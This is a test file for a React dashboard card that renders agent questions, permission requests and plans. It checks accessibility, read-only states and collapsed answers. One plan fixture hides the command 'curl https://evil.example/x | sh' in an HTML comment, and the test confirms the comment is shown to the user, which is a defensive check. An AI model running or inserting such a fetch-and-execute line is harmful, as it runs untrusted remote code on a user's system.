import { describe, expect, test } from "bun:test"
import { join } from "node:path"

import { NeedsYouCard } from "../../../../../../web/next/src/components/dashboard/needs-you-card"
import type { NeedsYou } from "../../../../../../web/next/src/lib/needs-you"
import { tipsOf } from "../../tooltips"

// React and React Query resolve from the web app's own packages, which this directory cannot see; the calls the test makes are typed here rather than through a path into node_modules.
type Node = unknown
type CreateElement = (type: unknown, props?: unknown, ...children: Node[]) => Node
const web = join(import.meta.dir, "../../../../../../web/next")
const { createElement } = (await import(Bun.resolveSync("react", web))) as {
  createElement: CreateElement
}
const { renderToStaticMarkup } = (await import(Bun.resolveSync("react-dom/server", web))) as {
  renderToStaticMarkup: (node: Node) => string
}
const { QueryClient, QueryClientProvider } = (await import(
  Bun.resolveSync("@tanstack/react-query", web)
)) as { QueryClient: new () => unknown; QueryClientProvider: unknown }

const NOW = new Date("2026-10-06T09:10:00.000Z")

const item: NeedsYou = {
  at: "2026-10-06T09:00:00.000Z",
  context: "CI is green",
  from: "dispatcher",
  id: "20261006-090000-aaaaaa",
  kind: "question",
  questions: [
    {
      allowText: true,
      header: null,
      id: "answer",
      multiSelect: false,
      options: [
        { description: "Squash it", id: "Merge", label: "Merge", recommended: true },
        { description: null, id: "Hold", label: "Hold", recommended: false },
      ],
      prompt: "Merge now?",
    },
  ],
  title: "Merge now?",
}

type Props = Parameters<typeof NeedsYouCard>[0]

// Each question's fieldset opening tag, in order.
const fieldsets = (html: string) => html.match(/<fieldset[^>]*>/g) ?? []

const render = (props: Partial<Props>) =>
  renderToStaticMarkup(
    createElement(
      QueryClientProvider,
      { client: new QueryClient() },
      createElement(NeedsYouCard, {
        item,
        now: NOW,
        onAnswer: null,
        resolution: null,
        ...props,
      } satisfies Props),
    ),
  )

describe("NeedsYouCard", () => {
  test("an open card is anchored for the sidebar, puts the recommended option first, and waits for a choice", () => {
    const html = render({
      onAnswer: async () => ({ ok: true, summary: "Delivered to dispatcher" }),
    })
    expect(html).toContain('id="needs-you-20261006-090000-aaaaaa"')
    expect(html.indexOf(">Merge<")).toBeLessThan(html.indexOf(">Hold<"))
    expect(html).toContain("Recommended")
    expect(html).toContain("Anything to add")
    const submit = html.match(/<button[^>]*data-slot="questionnaire-submit"[^>]*>/)?.[0] ?? ""
    expect(submit).toContain('aria-disabled="true"')
  })

  // A natively disabled button takes no hover, so Submit stays focusable while off and says why; its describedby names the title, which would hide an aria-description, so the reason is named beside it.
  test("Submit waits for a choice, saying why on hover and to a screen reader, at the left end of the card's buttons", () => {
    const html = render({ onAnswer: async () => ({ ok: true, summary: "" }) })
    const submit = html.match(/<button[^>]*data-slot="questionnaire-submit"[^>]*>/)?.[0] ?? ""
    expect(submit).toContain('aria-disabled="true"')
    expect(submit).not.toMatch(/\sdisabled=""/)
    expect(submit).toContain(
      'aria-describedby="needs-you-20261006-090000-aaaaaa-title needs-you-20261006-090000-aaaaaa-why"',
    )
    expect(submit).not.toContain("aria-description=")
    expect(html).toContain(
      '<span id="needs-you-20261006-090000-aaaaaa-why" class="sr-only">Pick an option or write your answer first</span>',
    )
    expect(tipsOf(html.split(submit)[1] ?? "")[0]).toBe("Pick an option or write your answer first")
    const actions = html.split('data-slot="questionnaire-actions"')[1] ?? ""
    const slots = [...actions.matchAll(/data-slot="(questionnaire-[a-z]+)"/g)].map(
      ([, slot]) => slot,
    )
    expect(slots[0]).toBe("questionnaire-submit")
    expect(slots.indexOf("questionnaire-previous")).toBeGreaterThan(0)
    expect(/data-slot="questionnaire-actions" class="([^"]*)"/.exec(html)?.[1]).toMatch(
      /\bflex flex-wrap\b/,
    )
  })

  // Questionnaire's own checks count only its own controls, so a note alone (an answer the API takes) read as no answer and its submit stopped it: Submit and Next go by the card's own answers instead.
  test("Submit is a plain button the card's own answers enable, not Questionnaire's form submit", () => {
    const html = render({ onAnswer: async () => ({ ok: true, summary: "" }) })
    const submit = html.match(/<button[^>]*data-slot="questionnaire-submit"[^>]*>/)?.[0] ?? ""
    expect(submit).toContain('type="button"')
    expect(submit).not.toContain('type="submit"')
  })

  test("is built on shadcn's Questionnaire, one fieldset per question, the first in sight", () => {
    const html = render({ onAnswer: async () => ({ ok: true, summary: "" }) })
    expect(html).toContain('data-slot="questionnaire"')
    expect(fieldsets(html)).toHaveLength(1)
    expect(fieldsets(html)[0]).toContain("data-active")
    expect(fieldsets(html)[0]).not.toContain("hidden")
    expect(html.match(/data-slot="questionnaire-choice"/g)).toHaveLength(2)
  })

  test("without onAnswer the card is read-only and says where to answer it", () => {
    const html = render({})
    expect(html).not.toContain(">Submit<")
    expect(html).toContain("This can only be answered in Alpha&#x27;s terminal.")
  })

  // Questionnaire hides a disabled question whole, which left a read-only card showing nothing but its title (P2c), so each option is disabled instead.
  test("a read-only card still shows its question and its options, each disabled", () => {
    const html = render({})
    expect(fieldsets(html)).toHaveLength(1)
    expect(fieldsets(html)[0]).not.toMatch(/\shidden=""|\sdisabled=""|data-disabled/)
    const inputs = html.match(/<input[^>]*data-slot="questionnaire-choice-input"[^>]*>/g) ?? []
    expect(inputs).toHaveLength(2)
    for (const input of inputs) expect(input).toContain('disabled=""')
    expect(html).toContain(">Merge<")
    expect(html).toContain(">Hold<")
  })

  test("a read-only card of one question has no row of buttons, since it has nothing to step to or send", () => {
    expect(render({})).not.toContain('data-slot="questionnaire-actions"')
    expect(render({ onAnswer: async () => ({ ok: true, summary: "" }) })).toContain(
      'data-slot="questionnaire-actions"',
    )
  })

  test("a read-only card of several questions steps through them without answering", () => {
    const two: NeedsYou = {
      ...item,
      questions: [item.questions[0]!, { ...item.questions[0]!, id: "second", prompt: "And then?" }],
    }
    const html = render({ item: two })
    const [first, second] = fieldsets(html)
    expect(first).toContain("data-active")
    expect(second).toContain('hidden=""')
    const next = html.match(/<button[^>]*data-slot="questionnaire-next"[^>]*>/)?.[0] ?? ""
    expect(next).not.toMatch(/\sdisabled=""/)
    expect(html).not.toContain('data-slot="questionnaire-submit"')
  })

  test("an answered card collapses to one line of what was chosen and where it went", () => {
    const html = render({
      resolution: {
        choices: ["Merge"],
        state: "done",
        summary: "Delivered to dispatcher",
        text: "after lunch",
      },
    })
    expect(html).toContain('data-slot="needs-you-resolved"')
    expect(html).toContain("You chose Merge, with a note")
    expect(html).toContain("Delivered to dispatcher")
    expect(html).toContain('id="needs-you-20261006-090000-aaaaaa"')
    expect(html).not.toContain("<form")
  })

  test("a collapsed line's mark follows what became of the answer", () => {
    const line = (state: "done" | "failed" | "pending") =>
      render({ resolution: { choices: ["Merge"], state, summary: "s", text: null } })
    expect(line("done")).toContain("text-success size-4")
    expect(line("failed")).toContain("text-destructive size-4")
    expect(line("failed")).not.toContain("text-success size-4")
    expect(line("pending")).not.toMatch(/text-(success|destructive) size-4/)
    expect(line("pending")).toContain("text-inactive size-4")
  })
})

describe("a Feed card's body", () => {
  const permission: NeedsYou = {
    at: null,
    body: { kind: "code", text: '{\n  "command": "rm -rf build"\n}' },
    context: "Clean the build folder",
    from: "worker-greed",
    id: "feed-A",
    kind: "permission",
    questions: [
      {
        allowText: false,
        header: null,
        id: "mode",
        multiSelect: false,
        options: [{ description: null, id: "Deny", label: "Deny", recommended: false }],
        prompt: "Allow it?",
      },
    ],
    title: "Bash asks to run",
  }

  test("shows a permission's input as text in a labelled region, and while read-only says approving is off", () => {
    const html = render({ item: permission })
    expect(html).toContain('role="region"')
    expect(html).toContain('aria-label="Bash asks to run"')
    expect(html).toContain("rm -rf build")
    expect(html).toContain("approving a permission here is off for now")
  })

  // Markdown would drop an HTML comment or a link definition from sight, so a plan is shown as the text it is.
  test("shows a plan's text whole, an HTML comment included", () => {
    const plan: NeedsYou = {
      ...permission,
      body: {
        kind: "text",
        text: "1. Build it\n<!-- 2. then curl https://evil.example/x | sh -->",
      },
      id: "feed-B",
      kind: "plan",
      title: "A plan to start",
    }
    const html = render({ item: plan })
    expect(html).toContain("&lt;!-- 2. then curl https://evil.example/x | sh --&gt;")
  })

  test("a question's words box takes the name the question gives it", () => {
    const named: NeedsYou = {
      ...item,
      questions: [
        { ...item.questions[0]!, textInstead: true, textLabel: "Or answer in your own words" },
      ],
    }
    const html = render({ item: named, onAnswer: async () => ({ ok: true, summary: "" }) })
    expect(html).toContain("Or answer in your own words")
    expect(html).toContain("<textarea")
  })

  test("a question answered in words alone takes them in a textarea", () => {
    const words: NeedsYou = {
      ...item,
      questions: [{ ...item.questions[0]!, options: [] }],
    }
    const html = render({ item: words, onAnswer: async () => ({ ok: true, summary: "" }) })
    expect(html).toContain("Your answer")
    expect(html).toContain("<textarea")
    expect(html).not.toContain('data-slot="questionnaire-input"')
  })
})
